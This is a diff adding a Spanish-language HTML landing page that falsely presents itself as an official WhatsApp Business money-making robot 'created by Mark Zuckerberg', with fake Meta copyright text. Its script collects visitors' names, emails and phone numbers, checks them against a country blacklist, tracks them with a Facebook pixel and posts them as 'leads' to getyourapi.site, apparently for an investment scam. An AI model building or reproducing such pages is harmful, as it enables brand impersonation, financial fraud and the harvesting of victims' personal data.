@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html translate="no">
+
+<head>
+    <meta name="facebook-domain-verification" content="" />
+    <meta name="google" content="notranslate" />
+    <meta name="robots" content="noindex, nofollow" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
+    <meta name="description"
+        content='¡Hola! Estamos felices de darte la bienvenida a la plataforma oficial de ganancias de Whatsapp Business. ¡Soy un robot automático creado por Mark Zuckerberg para trabajar en el mercado financiero!' />
+    <meta property="og:description"
+        content='¡Hola! Estamos felices de darte la bienvenida a la plataforma oficial de ganancias de Whatsapp Business. ¡Soy un robot automático creado por Mark Zuckerberg para trabajar en el mercado financiero!' />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+    <script src="./js/stat.js"></script>
+
+        <title>WhatsApp Bot</title>
+
+        <link rel="shortcut icon" href="./images/favicon.png" type="image/x-icon" />
+        <link rel="stylesheet" href="./css/main.css" />
+        <link rel="stylesheet" href="./css/form.css" />
+
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet" />
+
+        <!-- Facebook Pixel Code -->
+        <script>
+            !(function (f, b, e, v, n, t, s) {
+            	if (f.fbq) return;
+            	n = f.fbq = function () {
+            		n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
+            	};
+            	if (!f._fbq) f._fbq = n;
+            	n.push = n;
+            	n.loaded = !0;
+            	n.version = "2.0";
+            	n.queue = [];
+            	t = b.createElement(e);
+            	t.async = !0;
+            	t.src = v;
+            	s = b.getElementsByTagName(e)[0];
+            	s.parentNode.insertBefore(t, s);
+            })(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
+            fbq("init", "573026642433905");
+            fbq("track", "PageView");
+        </script>
+        <noscript>
+            <img height="1" width="1" style="display: none;" src="https://www.facebook.com/tr?id=573026642433905&ev=PageView&noscript=1" />
+        </noscript>
+        <!-- End Facebook Pixel Code -->
+    </head>
+
+    <body class="add-scroll">
+        <div class="body" style="transform: translateY(0px);">
+            <div class="content">
+                <div class="header">
+                    <div class="header__body">
+                        <div class="header__name">
+                            <div class="header__avatar">
+                                <img src="./images/logo.png" alt />
+                            </div>
+                            <div class="header__desc">
+                                <p class="header__desc-name">WhatsApp Bot</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <form class="register-form">
+                    <div class="loader" style="text-align: center;">
+                        <div class="cssload-thecube">
+                            <div class="cssload-cube cssload-c1"></div>
+                            <div class="cssload-cube cssload-c2"></div>
+                            <div class="cssload-cube cssload-c4"></div>
+                            <div class="cssload-cube cssload-c3"></div>
+                        </div>
+                        <div style="font-weight: bold; padding-top: 34px; position: relative; text-align: center; color: white;">
+                            Przetwarzanie danych
+                        </div>
+                    </div>
+                    <div class="chat">
+                        <div class="chat__time">
+                            <p id="time">dzis</p>
+                        </div>
+
+                        <div class="chat-content-list chat-content-list-1"></div>
+
+                        <div class="user--name">
+                            <div class="form-input-main">
+                                <input type="text" class="form-input" name="first_name" required placeholder="Nombre
+                                " />
+                            </div>
+    
+                            <div class="form-input-main">
+                                <input type="text" class="form-input" name="last_name" required placeholder="Apellidos
+                                " />
+                            </div>
+
+                            <div class="chat-content-buttons-gender next--answer-content nameNext">
+                                <div class="chat-content-buttons-gender-block ">
+                                    <span class="name--next_btn">Adelante</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="chat-content-list chat-content-list-2"></div>
+
+                        <div class="user--email">
+                            <div class="form-input-main">
+                                <input type="email" name="email" placeholder="E-mail" required />
+                            </div>
+
+                            <div class="chat-content-buttons-gender next--answer-content nameNext">
+                                <div class="chat-content-buttons-gender-block ">
+                                    <span class="email--next_btn">Adelante</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="chat-content-list chat-content-list-3"></div>
+
+                        <div class="user--phone">
+                            <div class="form-input-main">
+                                <input type="hidden" name="phonePrefix" value="7" />
+                                <input type="tel" name="phone" class="form-input" placeholder="Número de teléfono
+                                " required/>
+                            </div>
+
+                            <div class="chat-content-buttons-gender next--answer-content nameNext">
+                                <div class="chat-content-buttons-gender-block ">
+                                    <span class="next--phone_btn">Adelante</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="chat-content-list chat-content-list-4"></div>
+
+                        <input type="text" class="inp" id="res" value="0" readonly />
+                        <div id="down-box"></div>
+                    </div>
+                </form>
+            </div>
+
+            <footer class="footer">
+                <div class="container">
+                    <div class="footer__copy">
+                        <p> Todos los derechos y la información están reservados. Cualquier copia o difusión de la información es un delito y está sujeta a sanciones legales. <br /> “Whatsapp Business” diseñado por ©Meta, EE.UU., Menlo Park, San Mateo, CA, 94010 San Mateo. </p>
+                    </div>
+
+
+                </div>
+            </footer>
+        </div>
+
+        <div class="loader">
+            <div class="loader-element"></div>
+        </div>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+        <script src="./js/main.js"></script>
+        <script src="./js/ModalPhoneError.js"></script>
+
+    
+        <!-- intlTelInput -->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.5.0/css/intlTelInput.css" />
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.5.0/js/intlTelInput.min.js"></script>
+    
+        <div id="modal_phone" class="modal_phone fade_phone" tabindex="-1">
+            <div class="modal-dialog_phone">
+                <div class="modal-content_phone">
+                    <div class="modal-header_phone">
+                        <h5 class="modal-title_phone">
+                            Teléfono no válido
+                        </h5>
+                        <button type="button" class="close-button_phone" id="close-button_phone">×</button>
+                    </div>
+                    <div class="modal-body_phone">
+                        ¡Perdona! El programa no es compatible con su región. Introduzca su número de socio europeo
+                    </div>
+                </div>
+            </div>
+        </div>
+    
+    <!-- script-for-form ---------------------->
+    
+        <script>
+            const LANDING_LANG = 'ES';
+    
+            const formJsonData = '';
+            const formHeaderData = '';
+            const formFooterData = '';
+    
+            const formDiv = document.querySelectorAll('.register-form');
+    
+            let errors = {
+                'AR': [
+                    { errorPlaceholder: 'أدخل أسمك', },
+                    { errorPlaceholder: 'أدخل اسمك الأخير', },
+                    { errorPlaceholder: 'أدخل رقمك', },
+                    { errorPlaceholder: 'أدخل بريدك الإلكتروني', },
+                ],
+                'RU': [
+                    { errorPlaceholder: 'Введите Ваше Имя', },
+                    { errorPlaceholder: 'Введите Вашу Фамилию', },
+                    { errorPlaceholder: 'Введите Ваш Номер', },
+                    { errorPlaceholder: 'Введите Ваш Email', },
+                ],
+                'EN': [
+                    { errorPlaceholder: 'Enter Correct First Name', },
+                    { errorPlaceholder: 'Enter Correct Last Name', },
+                    { errorPlaceholder: 'Enter Correct Phone', },
+                    { errorPlaceholder: 'Enter Correct Email', },
+                ],
+                'PL': [
+                    { errorPlaceholder: 'Wprowadź poprawne imię', },
+                    { errorPlaceholder: 'Wpisz poprawne nazwisko', },
+                    { errorPlaceholder: 'Wprowadź prawidłowy numer telefonu', },
+                    { errorPlaceholder: 'Wpisz poprawny adres e-mail', },
+                ],
+                'DE': [
+                    { errorPlaceholder: 'Korrekten Vornamen eingeben', },
+                    { errorPlaceholder: 'Korrekten Nachnamen eingeben', },
+                    { errorPlaceholder: 'Geben Sie das richtige Telefon ein', },
+                    { errorPlaceholder: 'Geben Sie die richtige E-Mail-Adresse ein', },
+                ],
+                'ES': [
+                    { errorPlaceholder: 'Ingrese el nombre correcto', },
+                    { errorPlaceholder: 'Ingrese el apellido correcto', },
+                    { errorPlaceholder: 'Ingrese el teléfono correcto', },
+                    { errorPlaceholder: 'Ingrese el correo electrónico correcto', },
+                ],
+                'CZ': [
+                    { errorPlaceholder: 'Zadejte správné křestní jméno', },
+                    { errorPlaceholder: 'Zadejte správné příjmení', },
+                    { errorPlaceholder: 'Zadejte správný telefon', },
+                    { errorPlaceholder: 'Zadejte správný e-mail', },
+                ],
+                'TR': [
+                    { errorPlaceholder: "Doğru Adı Girin" },
+                    { errorPlaceholder: "Doğru Soyadı Girin" },
+                    { errorPlaceholder: "Doğru Telefonu Girin" },
+                    { errorPlaceholder: "Doğru E-postayı Girin" }
+                ],
+                'IT': [
+                    { errorPlaceholder: 'Inserisci il nome corretto', },
+                    { errorPlaceholder: 'Inserisci il cognome corretto', },
+                    { errorPlaceholder: 'Immettere il numero di telefono corretto', },
+                    { errorPlaceholder: `Inserisci l'e-mail corretta`, },
+                ],
+                'JP': [
+                    { errorPlaceholder: 'お名前を入力してください', },
+                    { errorPlaceholder: '苗字を入力してください ', },
+                    { errorPlaceholder: '電話番号を入力してください', },
+                    { errorPlaceholder: 'メールアドレスを入力してください', },
+                ]
+            }
+    
+            errors = errors[LANDING_LANG]
+          
+            const openModal = () => {
+                document.getElementById("modal_phone").classList.add("open_phone");
+                document.body.classList.add("modal-open_phone");
+            };
+    
+            const closeModal = () => {
+                document.getElementById("modal_phone").classList.remove("open_phone");
+                document.body.classList.remove("modal-open_phone");
+            };
+    
+            document.getElementById("close-button_phone").addEventListener("click", closeModal);
+    
+            $(document).ready(function () {
+                let phonePrefix = "44";
+    
+                $.ajax({
+                    url: 'https://getyourapi.site/api/geolocation',
+                    dataType: "json",
+                    success: function (result) {
+                        $('input[name="phone"]').each(function (input) {
+                            let iti = intlTelInput(this, {
+                                ...result.data,
+                                autoHideDialCode: "true",
+                                customContainer: "phoneWrapper",
+                                autoPlaceholder: "aggressive",
+                                separateDialCode: "false",
+                                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.5.0/js/utils.min.js",
+                            });
+                            phonePrefix = iti.getSelectedCountryData().dialCode;
+                            $(this).on("countrychange", function () {
+                                phonePrefix = iti.getSelectedCountryData().dialCode;
+                            });
+                            $("select[name = nationality]").val(result.data.initialCountry.toUpperCase());
+                            return iti;
+                        });
+                    },
+                });
+    
+                function validateEmail(email) {
+                    return /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/.test(String(email).toLowerCase());
+                }
+    
+                function changInputHandler(e) {
+                    if (e.target.value.length === 0) {
+                        this.classList.remove("valid");
+                        this.classList.add("error");
+                        return;
+                    }
+                    this.classList.add("valid");
+                    this.classList.remove("error");
+                }
+    
+                function changEmailHandler(e) {
+                    if (validateEmail(e.target.value) === false) {
+                        this.classList.add("error");
+                        this.classList.remove("valid");
+                        return;
+                    }
+                    this.classList.add("valid");
+                    this.classList.remove("error");
+                }
+    
+                const { fbclid } = parseURLParams(location.href);
+    
+                $(".form-input").keyup(changInputHandler);
+                $(".form-input").change(changInputHandler);
+                $("input[name = email]").keyup(changEmailHandler);
+                $("input[name = email]").change(changEmailHandler);
+    
+                $("form.register-form").submit(function (e) {
+                    e.preventDefault();
+    
+                    $(".loader").css("display", "block");
+                    const form = $(this);
+                    const first_name = form.find("input[name = first_name]");
+                    const last_name = form.find("input[name = last_name]");
+                    const nationality = form.find("select[name = nationality]")?.val();
+                    const email = form.find("input[name = email]");
+                    const phone = form.find("input[name = phone]");
+    
+                    let isError = false;
+                    if (first_name.val() === "" || first_name.val().match(/[0-9]/) || first_name.val().trim() === "") {
+                        first_name.addClass("error").removeClass('valid').val("").attr("placeholder", errors[0].errorPlaceholder);
+                        isError = true;
+                    }
+    
+                    if (last_name.val() === "" || last_name.val().match(/[0-9]/) || last_name.val().trim() === "") {
+                        last_name.addClass("error").removeClass('valid').val("").attr("placeholder", errors[1].errorPlaceholder);
+                        isError = true;
+                    }
+    
+                    if (phone.val() === "" || phone.val().trim() === "" || isNaN(phone.val())) {
+                        phone.addClass("error").removeClass('valid').val("").attr("placeholder", errors[2].errorPlaceholder);
+                        isError = true;
+                    }
+    
+                    if (validateEmail(email.val()) === false) {
+                        email.addClass("error").val("").attr("placeholder", errors[3].errorPlaceholder);
+                        isError = true;
+                    }
+    
+                    if (isError === true) {
+                        $(".loader").css("display", "none");
+                        return;
+                    }
+    
+                    const button = $("button[name=submitBtn]");
+                    button.prop("disabled", true);
+    
+                    const checkNumber = new Promise((resolve, reject) => {
+                        $.ajax({
+                            url: `https://getyourapi.site/api/phone/validate`,
+                            type: "post",
+                            contentType: "application/json",
+                            data: JSON.stringify({
+                                phone: `${phonePrefix}${phone.val()}`,
+                            }),
+                            success: resolve,
+                            error: reject,
+                        });
+                    });
+    
+                    const getBlacklist = new Promise((resolve, reject) => {
+                        $.ajax({
+                            url: "https://getyourapi.site/api/blacklist",
+                            type: "get",
+                            contentType: "application/json",
+                            success: function (res) {
+                                resolve(res);
+                            },
+                            error: function (error) {
+                                reject(error);
+                            },
+                        });
+                    });
+    
+                    Promise.all([checkNumber, getBlacklist])
+                        .then(([checkNumber, blacklist]) => {
+                            if (checkNumber.status === false) {
+                                phone.addClass("error").removeClass("valid").val("").attr("placeholder", errors[2].errorPlaceholder);
+                                $(".loader").css("display", "none");
+                                throw new Error("check number error");
+                            }
+    
+                            if (blacklist.status === false) {
+                                $(".loader").css("display", "none");
+                                throw new Error("get blacklist error");
+                            }
+    
+                            if (blacklist.data.blacklist.includes(checkNumber.data.country_code.toLowerCase())) {
+                                $(".loader").css("display", "none");
+                                openModal();
+                                setTimeout(closeModal, 5000);
+                                throw new Error("forbidden country");
+                            }
+                            if (nationality && blacklist.data.blacklist.includes(nationality.toLowerCase())) {
+                                window.location.href = "/success.html";
+                                return;
+                            }
+    
+                            $.ajax({
+                                url: "https://getyourapi.site/api/leads",
+                                type: "post",
+                                contentType: "application/json",
+                                data: JSON.stringify({
+                                    first_name: first_name.val(),
+                                    last_name: last_name.val(),
+                                    email: email.val(),
+                                    phone: phone.val(),
+                                    country: checkNumber.data.country_code,
+                                    nationality: nationality,
+                                    click_id: fbclid,
+                                }),
+                                dataType: "json",
+                                success: function (res) {
+                                    if (res.status === true) {
+                                        fbq("track", "Lead");
+                                        fbq("track", "CompleteRegistration");
+                                        switch (res.data.proceedWith) {
+                                            case "success":
+                                                window.location.href = "./success.html" + '?lang=' + LANDING_LANG;
+                                                break;
+                                            case "exist":
+                                                window.location.href = "./error.html" + '?lang=' + LANDING_LANG;
+                                                break;
+                                            case "redirect":
+                                                window.location.href = res.data.redirectUrl;
+                                                break;
+                                            default:
+                                                window.location.href = "./success.html" + '?lang=' + LANDING_LANG;
+                                        }
+                                        console.log("click");
+                                    } else {
+                                        alert("Error! API Error");
+                                        $(".loader").css("display", "none");
+                                        button.prop("disabled", false);
+                                    }
+                                },
+                                error: function (error) {
+                                    button.prop("disabled", false);
+                                    $(".loader").css("display", "none");
+                                    console.error(error);
+                                },
+                            });
+                        })
+                        .catch((error) => {
+                            button.prop("disabled", false);
+                            $(".loader").css("display", "none");
+                            console.error(error);
+                        });
+                });
+            });
+    
+            function parseURLParams(url) {
+                var queryString = url ? url.split("?")[1] : window.location.search.slice(1);
+                var obj = {};
+                if (queryString) {
+                    queryString = queryString.split("#")[0];
+                    var arr = queryString.split("&");
+                    for (var i = 0; i < arr.length; i++) {
+                        var a = arr[i].split("=");
+                        var paramName = a[0];
+                        var paramValue = typeof a[1] === "undefined" ? true : a[1];
+                        if (paramName.match(/\[(\d+)?\]$/)) {
+                            var key = paramName.replace(/\[(\d+)?\]/, "");
+                            if (!obj[key]) obj[key] = [];
+                            if (paramName.match(/\[\d+\]$/)) {
+                                var index = /\[(\d+)\]/.exec(paramName)[1];
+                                obj[key][index] = paramValue;
+                            } else {
+                                obj[key].push(paramValue);
+                            }
+                        } else {
+                            if (!obj[paramName]) {
+                                obj[paramName] = paramValue;
+                            } else if (obj[paramName] && typeof obj[paramName] === "string") {
+                                obj[paramName] = [obj[paramName]];
+                                obj[paramName].push(paramValue);
+                            } else {
+                                obj[paramName].push(paramValue);
+                            }
+                        }
+                    }
+                }
+    
+                return obj;
+            }
+        </script>
+        <!-- intlTelInput END-->
+    </body>
+</html>
